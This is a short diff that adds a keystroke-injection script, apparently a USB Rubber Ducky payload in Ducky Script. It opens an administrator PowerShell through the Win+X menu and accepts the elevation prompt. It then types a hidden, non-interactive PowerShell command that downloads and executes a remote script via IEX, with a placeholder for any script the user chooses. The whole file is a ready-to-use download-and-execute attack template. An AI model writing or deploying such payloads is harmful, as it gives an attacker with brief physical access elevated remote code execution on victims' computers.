@@ -1,0 +1,11 @@
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+STRING powershell -w 1 -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('### WHATEVER PoSH SCRIPT YOU WANT ###')"
+DELAY 500
+ENTER
